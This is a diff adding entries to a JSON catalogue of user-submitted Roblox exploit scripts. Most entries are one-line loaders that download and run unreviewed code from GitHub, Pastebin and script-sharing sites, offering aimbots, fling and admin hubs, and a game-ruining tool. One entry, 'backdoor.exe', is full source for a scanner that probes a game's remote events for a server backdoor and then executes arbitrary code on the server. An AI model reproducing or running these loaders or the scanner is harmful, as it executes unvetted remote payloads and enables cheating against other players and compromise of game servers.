@@ -1343,6 +1343,198 @@
       "Script_Title": "auto wall Hop",
       "User_ID": 5439658394,
       "Username": "GustaGb7_gg"
+    },
+    "Script203": {
+      "Date": "October 31 2024",
+      "Description": "mini hub blox fruit",
+      "Script": "loadstring(game:HttpGet\"https://raw.githubusercontent.com/Basicallyy/Basicallyy/main/MinGamingV4.lua\")()",
+      "Script_Title": "blox fruit hub",
+      "User_ID": 4915261632,
+      "Username": "CarlMaxGucela"
+    },
+    "Script205": {
+      "Date": "October 31 2024",
+      "Description": "Made for chatting with strangers",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Guerric9018/chatbothub/main/ChatbotHub.lua\"))()",
+      "Script_Title": "Chatbot",
+      "User_ID": 3162728274,
+      "Username": "Mashi_0202"
+    },
+    "Script206": {
+      "Date": "October 31 2024",
+      "Description": "Only works on Roblox got talent",
+      "Script": "pcall(function()\nloadstring(game:HttpGet(\"https://raw.githubusercontent.com/hellohellohell012321/TALENTLESS/main/TALENTLESS\", true))()\nend)",
+      "Script_Title": "Auto Piano",
+      "User_ID": 3162728274,
+      "Username": "Mashi_0202"
+    },
+    "Script208": {
+      "Date": "October 31 2024",
+      "Description": "U can type here to make any word very kawaii ",
+      "Script": "pcall(function()\nloadstring(game:HttpGet(\"https://raw.githubusercontent.com/hellohellohell012321/KAWAII-BYPASS/main/kawaii-bypass\",true))()\nend)",
+      "Script_Title": "Kawaii Bypass",
+      "User_ID": 3162728274,
+      "Username": "Mashi_0202"
+    },
+    "Script209": {
+      "Date": "October 31 2024",
+      "Description": "Only works in rate my avatar",
+      "Script": "pcall(function()\nloadstring(game:HttpGet(\"https://raw.githubusercontent.com/hellohellohell012321/rate-my-avatar-gui/main/main.lua\", true))()\nend)",
+      "Script_Title": "Rate My Avatar",
+      "User_ID": 3162728274,
+      "Username": "Mashi_0202"
+    },
+    "Script210": {
+      "Date": "October 31 2024",
+      "Description": "well Maybe it's kinda useful?",
+      "Script": "pcall(function()\nloadstring(game:HttpGet(\"https://raw.githubusercontent.com/hellohellohell012321/therapy-gui/main/therapy-gui.lua\", true))()\nend)",
+      "Script_Title": "Therapy",
+      "User_ID": 3162728274,
+      "Username": "Mashi_0202"
+    },
+    "Script211": {
+      "Date": "October 31 2024",
+      "Description": "lol kinda funny",
+      "Script": "pcall(function()\nloadstring(game:HttpGet(\"https://raw.githubusercontent.com/hellohellohell012321/obby-ruiner/main/obby-ruiner.lua\",true))()\nend)",
+      "Script_Title": "obby ruiner",
+      "User_ID": 3162728274,
+      "Username": "Mashi_0202"
+    },
+    "Script212": {
+      "Date": "October 31 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://darkscripts.space/scripts/407a030498.lua', true))()",
+      "Script_Title": "huge",
+      "User_ID": 7500707430,
+      "Username": "kiloooo292"
+    },
+    "Script213": {
+      "Date": "October 31 2024",
+      "Description": "if not working go check out dti v2",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/01iq/me/refs/heads/main/DressToImpress\",true))()",
+      "Script_Title": "Dti ",
+      "User_ID": 3162728274,
+      "Username": "Mashi_0202"
+    },
+    "Script214": {
+      "Date": "October 31 2024",
+      "Description": "if not working then maybe it's broken",
+      "Script": "\nloadstring(game:HttpGet(\"https://raw.githubusercontent.com/01iq/me/refs/heads/main/DressToImpress\",true))()```",
+      "Script_Title": "dti v2",
+      "User_ID": 3162728274,
+      "Username": "Mashi_0202"
+    },
+    "Script215": {
+      "Date": "October 31 2024",
+      "Description": "it might not work if doesn't it means it's broken or either patched",
+      "Script": "loadstring(game:HttpGet(\"https://scriptblox.com/raw/RIVALS-2024-keyless-free-script-NEW-17546\"))()",
+      "Script_Title": "Rivals Aimbot",
+      "User_ID": 3162728274,
+      "Username": "Mashi_0202"
+    },
+    "Script216": {
+      "Date": "October 31 2024",
+      "Description": "This script is for sonic.exe The disaster (1.2). After running it you must restart",
+      "Script": "game.ReplicatedStorage.settingsDisplay.debugMode.Value = true",
+      "Script_Title": "SETD Debug",
+      "User_ID": 4863807785,
+      "Username": "rimypue"
+    },
+    "Script218": {
+      "Date": "October 31 2024",
+      "Description": "maybe use this null hub [im not the Creator]",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-NullHub-14638\"))()",
+      "Script_Title": "NULL HUB",
+      "User_ID": 7444141688,
+      "Username": "Whyso_serious587"
+    },
+    "Script219": {
+      "Date": "October 31 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://pastebin.com/raw/TqgbdDjF\"))()",
+      "Script_Title": "idk",
+      "User_ID": 7397168275,
+      "Username": "sean_200066"
+    },
+    "Script220": {
+      "Date": "October 31 2024",
+      "Description": "infinite Yield FE",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()",
+      "Script_Title": "infinite Yield ",
+      "User_ID": 3899074220,
+      "Username": "idbridg"
+    },
+    "Script221": {
+      "Date": "October 30 2024",
+      "Description": "use this backdoor scanner to hack games (BACKDOOR ONLY GAMES)",
+      "Script": "-- Services\nlocal Players = game:GetService(\"Players\")\nlocal CoreGui = game:GetService(\"CoreGui\")\nlocal Lighting = game:GetService(\"Lighting\");\nlocal Workspace = game:GetService(\"Workspace\");\nlocal JointsService = game:GetService(\"JointsService\")\nlocal ReplicatedStorage = game:GetService(\"ReplicatedStorage\")\nlocal RobloxReplicatedStorage = game:GetService(\"RobloxReplicatedStorage\")\n\n-- Variables\nlocal LocalPlayer = Players.LocalPlayer\nlocal RobloxGui = CoreGui.RobloxGui\n\n-- Functions\nlocal dateTimeNow = DateTime.now\nlocal tableFind = table.find\nlocal taskSpawn = task.spawn\nlocal taskWait = task.wait\nlocal stringRep = string.rep\nlocal mathRandom = math.random\n\n-- Globals\nlocal attached = false;\nlocal backdoor = nil;\nlocal commonPlaces = {\n\tReplicatedStorage,\n\tWorkspace,\n\tLighting\n};\nlocal remoteCodes = {};\n\n-- Constants\nlocal INV_CODE = \"xJHCqm84cW\";\nlocal STRING_VALUE_NAME = mathRandom(1000000, 9999999);\n\n\nif RobloxGui:FindFirstChild(\"V6\") then RobloxGui:FindFirstChild(\"V6\"):Destroy(); print(\"Refreshed\"); end\nlocal Variables = loadstring(game:HttpGet(\"https://raw.githubusercontent.com/iK4oS/backdoor.exe/indev/ui.lua\"))()\n\nVariables.UI.Main.Active = true\nVariables.UI.Main.Draggable = true\n\nlocal function notify(text,cb,b1,b2)\n\tgame:GetService(\"StarterGui\"):SetCore(\n\t\t\"SendNotification\",{\n\t\t\tTitle = \"backdoor.exe\",\n\t\t\tDuration = 3,\n\t\t\tText = text,\n\t\t\tCallback = cb,\n\t\t\tButton1 = b1,\n\t\t\tButton2 = b2\n\t\t}\n\t)\nend\n\nlocal function validRemote(rm)\n\tlocal Parent = rm.Parent\n\tlocal class = rm.ClassName\n\tif class ~= \"RemoteEvent\" and class ~= \"RemoteFunction\" then return false end\n\n\tif Parent then\n\t\tif Parent == JointsService then return false end\n\t\tif (Parent == ReplicatedStorage and rm:FindFirstChild(\"__FUNCTION\")) or\n        (rm.Name == \"__FUNCTION\" and Parent.ClassName == \"RemoteEvent\" and Parent.Parent == ReplicatedStorage) then return false end\n\tend\n\n\tif rm:IsDescendantOf(RobloxReplicatedStorage) then return false end\n\n\treturn true\nend\n\nlocal function scanDescendants(parent)\n\tlocal descendance = parent:GetDescendants();\n\tfor i=1, #descendance do\n\t\tlocal descendant = descendance[i];\n\n\n\t\tif not validRemote(descendant) then continue; end\n\t\t\n\t\t--if #remoteCodes == 5 then remoteCodes.clear(); end\n\t\tlocal remoteCode = tostring(mathRandom(100000, 999999));\n\t\tremoteCodes[remoteCode] = descendant;\n\t\t\n\t\tlocal remoteClass = descendant.ClassName\n\t\tlocal requireScript = (\"i=Instance.new('StringValue', game.Workspace); i.Name='%s'; i.Value='%s'\"):format(STRING_VALUE_NAME, remoteCode)\n\n\t\tif remoteClass == \"RemoteEvent\" then\n\t\t\tdescendant:FireServer(requireScript)\n\n\t\telseif remoteClass == \"RemoteFunction\" then\n\t\t\tlocal waiting = true\n\t\t\ttaskSpawn(function()\n\t\t\t\tdescendant:InvokeServer(requireScript)\n\t\t\t\twaiting = nil\n\t\t\tend)\n\n            -- If RemoteFunction don't respond in 1 second, we skip this one.\n\t\t\tlocal start = dateTimeNow().UnixTimestampMillis\n\t\t\twhile waiting and 1000 > dateTimeNow().UnixTimestampMillis - start do\n\t\t\t\ttaskWait()\n\t\t\tend\n\t\tend\n\n\t\tif Workspace:FindFirstChild(STRING_VALUE_NAME) then\n\t\t\tattached = true\n\t\t\tbackdoor = remoteCodes[Workspace:FindFirstChild(STRING_VALUE_NAME).Value]\n\t\t\tbackdoor:FireServer((\"game.Workspace['%s']:Destroy()\"):format(STRING_VALUE_NAME)) -- Cleaning up after tonumberselves\n\n\t\t\treturn true\n\t\tend\n\tend\nend\nlocal function scanGame()\n    local found = false\n\t-- Scan Common Places\n\tfor i=1, #commonPlaces do\n\t\tlocal place = commonPlaces[i];\n\t\tif scanDescendants(place) then\n            found = true\n        end\n\tend\n\t-- Scan the rest of the game\n\tlocal children = game:GetChildren();\n\tfor i=1, #children do\n\t\tlocal child = children[i];\n\t\t-- We ofcourse don't need to check the common places again, do we?\n\t\tif tableFind(commonPlaces, child) then continue; end\n\t\t\n\t\tif scanDescendants(child) then \n            found = true\n        end\n\tend\n    if found then\n        notify(\"Backdoor Found!\")\n        Variables.Topbar.Status.Text = \"Attached\"\n        Variables.Topbar.Status.Circle.Status_Color.BackgroundColor3 = Color3.fromRGB(95, 185, 47)\n    else\n        notify(\"Unable to find backdoor!\")\n        Variables.Topbar.Status.Text = \"Failed\"\n    end\n\n\treturn found;\nend\nlocal function executeScript(script)\n    if not attached then\n        local function callback(text)\n\t\t\tif text == \"Yes\" then\n\t\t\t\tif scanGame() then\n\t\t\t\t    executeScript(script)\n\t\t\t\tend\n\t\t\telseif text == \"No\" then\n\t\t\t\treturn\n\t\t\tend\n\t\tend\n\t\n\t\tlocal bf = Instance.new(\"BindableFunction\"); bf.OnInvoke = callback\n\t\tnotify(\"You're not attached.\\nWould you like to attach now?\", bf, \"Yes\", \"No\")\n\t\treturn\n    end\n    \n    local script = script or Variables.SourceFrame.Source.Text\n    if backdoor.ClassName == \"RemoteEvent\" then\n        backdoor:FireServer(script)\n    elseif backdoor.ClassName == \"RemoteFunction\" then\n        backdoor:InvokeServer(script)\n    end\nend\n\n\n\n\n\nlocal function promtDiscordInvite()\n    local httpService = game:GetService(\"HttpService\")\n    local httpRequest = (syn and syn.request) or (httpService and httpService.request) or http_request\n\n    if not httpRequest then setclipboard(INV_CODE) notify(\"Invite code copied!\") return end\n    \n    local request = httpRequest({\n        Url = \"http://127.0.0.1:6463/rpc?v=1\",\n        Method = \"POST\",\n\n        Headers = {\n            ['Content-Type'] = 'application/json',\n            Origin = 'https://discord.com'\n        },\n\n        Body = httpService:JSONEncode({\n            args = {code = INV_CODE},\n            cmd = 'INVITE_BROWSER',\n            nonce = httpService:GenerateGUID(false)\n        })\n    })\n\n\tif request.StatusCode ~= 200 or httpService:JSONDecode(request.Body).data.code == 4011 then\n\t    notify(\"Invite code copied!\") \n\t\tsetclipboard(INV_CODE)\n\t\treturn\n\tend\n\t\n\tnotify(\"You have been promted to join our Discord. Open your Discord.\")\n\nend\n\nVariables.Topbar.CloseButton.MouseButton1Click:Connect(function() Variables.UI:Destroy() end)\nVariables.Topbar.R6Button.MouseButton1Click:Connect(function() executeScript((\"require(3041175937):r6('%s')\"):format(LocalPlayer.Name)) end)\nVariables.MainButtons.ScanButton.MouseButton1Click:Connect(scanGame)\nVariables.MainButtons.ExecuteButton.MouseButton1Click:Connect(executeScript)\nVariables.MainButtons.ClearButton.MouseButton1Click:Connect(function() Variables.SourceFrame.Source.Text = \"\" end)\nVariables.MainButtons.HideButton.MouseButton1Click:Connect(function() Variables.SourceFrame.Source.Visible = not Variables.SourceFrame.Source.Visible end)\nVariables.MainButtons.InviteButton.MouseButton1Click:Connect(promtDiscordInvite)\n\n\n\n--\tk4scripts\n--\t.------.\n--\t|4.--. |\n--\t| :│/: |\n--\t| :│\\: |\n--\t| '--'4|\n--\t`------'",
+      "Script_Title": "backdoor.ExEv6x",
+      "User_ID": 2371503844,
+      "Username": "pelusopapu"
+    },
+    "Script222": {
+      "Date": "October 31 2024",
+      "Description": "execute🎥  Unable to close",
+      "Script": "local cam = workspace.CurrentCamera\nlocal UIS = game:GetService(\"UserInputService\")\nlocal RS = game:GetService(\"RunService\")\nlocal onMobile = not UIS.KeyboardEnabled\nlocal keysDown = {}\nlocal rotating = false\n\nif not game:IsLoaded() then game.Loaded:Wait() end\n\ncam.CameraType = Enum.CameraType.Scriptable\n\nlocal speed = 5\nlocal sens = .3\n\nspeed /= 10\nif onMobile then sens*=2 end\n\nlocal function renderStepped()\n    if rotating then\n        local delta = UIS:GetMouseDelta()\n        local cf = cam.CFrame\n        local yAngle = cf:ToEulerAngles(Enum.RotationOrder.YZX)\n        local newAmount = math.deg(yAngle)+delta.Y\n        if newAmount > 65 or newAmount < -65 then\n            if not (yAngle<0 and delta.Y<0) and not (yAngle>0 and delta.Y>0) then\n                delta = Vector2.new(delta.X,0)\n            end \n        end\n        cf *= CFrame.Angles(-math.rad(delta.Y),0,0)\n        cf = CFrame.Angles(0,-math.rad(delta.X),0) * (cf - cf.Position) + cf.Position\n        cf = CFrame.lookAt(cf.Position, cf.Position + cf.LookVector)\n        if delta ~= Vector2.new(0,0) then cam.CFrame = cam.CFrame:Lerp(cf,sens) end\n        UIS.MouseBehavior = Enum.MouseBehavior.LockCurrentPosition\n    else\n        UIS.MouseBehavior = Enum.MouseBehavior.Default\n    end\n\n    if keysDown[\"Enum.KeyCode.W\"] then\n        cam.CFrame *= CFrame.new(Vector3.new(0,0,-speed))\n    end\n    if keysDown[\"Enum.KeyCode.A\"] then\n        cam.CFrame *= CFrame.new(Vector3.new(-speed,0,0))\n    end\n    if keysDown[\"Enum.KeyCode.S\"] then\n        cam.CFrame *= CFrame.new(Vector3.new(0,0,speed))\n    end\n    if keysDown[\"Enum.KeyCode.D\"] then\n        cam.CFrame *= CFrame.new(Vector3.new(speed,0,0))\n    end\nend\n\nRS.RenderStepped:Connect(renderStepped)\n\nlocal validKeys = {\"Enum.KeyCode.W\",\"Enum.KeyCode.A\",\"Enum.KeyCode.S\",\"Enum.KeyCode.D\"}\n\nUIS.InputBegan:Connect(function(Input)\n    for i, key in pairs(validKeys) do\n        if key == tostring(Input.KeyCode) then\n            keysDown[key] = true\n        end\n    end\n    if Input.UserInputType == Enum.UserInputType.MouseButton2 or (Input.UserInputType == Enum.UserInputType.Touch and UIS:GetMouseLocation().X>(cam.ViewportSize.X/2)) then\n        rotating = true\n    end\n    if Input.UserInputType == Enum.UserInputType.Touch then\n        if Input.Position.X < cam.ViewportSize.X/2 then\n            touchPos = Input.Position\n        end\n    end\nend)\n\nUIS.InputEnded:Connect(function(Input)\n    for key, v in pairs(keysDown) do\n        if key == tostring(Input.KeyCode) then\n            keysDown[key] = false\n        end\n    end\n    if Input.UserInputType == Enum.UserInputType.MouseButton2 or (Input.UserInputType == Enum.UserInputType.Touch and UIS:GetMouseLocation().X>(cam.ViewportSize.X/2)) then\n        rotating = false\n    end\n    if Input.UserInputType == Enum.UserInputType.Touch and touchPos then\n        if Input.Position.X < cam.ViewportSize.X/2 then\n            touchPos = nil\n            keysDown[\"Enum.KeyCode.W\"] = false\n            keysDown[\"Enum.KeyCode.A\"] = false\n            keysDown[\"Enum.KeyCode.S\"] = false\n            keysDown[\"Enum.KeyCode.D\"] = false\n        end\n    end\nend)\n\nUIS.TouchMoved:Connect(function(input)\n    if touchPos then\n        if input.Position.X < cam.ViewportSize.X/2 then\n            if input.Position.Y < touchPos.Y then\n                keysDown[\"Enum.KeyCode.W\"] = true\n                keysDown[\"Enum.KeyCode.S\"] = false\n            else\n                keysDown[\"Enum.KeyCode.W\"] = false\n                keysDown[\"Enum.KeyCode.S\"] = true\n            end\n            if input.Position.X < (touchPos.X-15) then\n                keysDown[\"Enum.KeyCode.A\"] = true\n                keysDown[\"Enum.KeyCode.D\"] = false\n            elseif input.Position.X > (touchPos.X+15) then\n                keysDown[\"Enum.KeyCode.A\"] = false\n                keysDown[\"Enum.KeyCode.D\"] = true\n            else\n                keysDown[\"Enum.KeyCode.A\"] = false\n                keysDown[\"Enum.KeyCode.D\"] = false\n            end\n        end\n    end\nend)",
+      "Script_Title": "Free camera",
+      "User_ID": 3899074220,
+      "Username": "idbridg"
+    },
+    "Script224": {
+      "Date": "October 31 2024",
+      "Description": "Fly Gui V2",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/ICraftPe/ICraftPe/main/Fly2\"))()-- Hub",
+      "Script_Title": "FLY V2",
+      "User_ID": 3899074220,
+      "Username": "idbridg"
+    },
+    "Script226": {
+      "Date": "October 31 2024",
+      "Description": "it's not fe",
+      "Script": "loadstring(game:HttpGet('https://pastebin.com/raw/wC64LrAJ',true))()",
+      "Script_Title": "versus not fe",
+      "User_ID": 3616642105,
+      "Username": "Dylan2_2898"
+    },
+    "Script228": {
+      "Date": "October 31 2024",
+      "Description": "Domain expansion tsb - saitama to Gojo -",
+      "Script": "-- GOJO DOMAIN moveset\nloadstring(game:HttpGet(\"https://pastebin.com/raw/777Q4QDN\",true))()",
+      "Script_Title": "Gojo domain tsb",
+      "User_ID": 2233074357,
+      "Username": "sh1meju10"
+    },
+    "Script229": {
+      "Date": "October 31 2024",
+      "Description": "",
+      "Script": "fe fling\ninfinite menu\ninfinite yield \n",
+      "Script_Title": "3008",
+      "User_ID": 7521059153,
+      "Username": "KIMSUNOOSTAN21"
+    },
+    "Script230": {
+      "Date": "October 31 2024",
+      "Description": "Credit To ToraIs Me",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/ToraScript/Script/main/HideorDie\"))()",
+      "Script_Title": "Hide or Die",
+      "User_ID": 5213413045,
+      "Username": "farrapada8w"
+    },
+    "Script231": {
+      "Date": "October 31 2024",
+      "Description": "物人で使える無敵だよ〜",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/creepstu/fuzzy-octo-giggle/main/Source'))()",
+      "Script_Title": "日本です",
+      "User_ID": 5856696626,
+      "Username": "pullnosabu"
+    },
+    "Script232": {
+      "Date": "October 31 2024",
+      "Description": "Nameless admin (edited) no byfron ui NA",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-Nameless-Admin-no-byfron-ui-11288\"))()",
+      "Script_Title": "NameLessAdmin *",
+      "User_ID": 4485373429,
+      "Username": "Roghernandeez"
     }
   }
 }
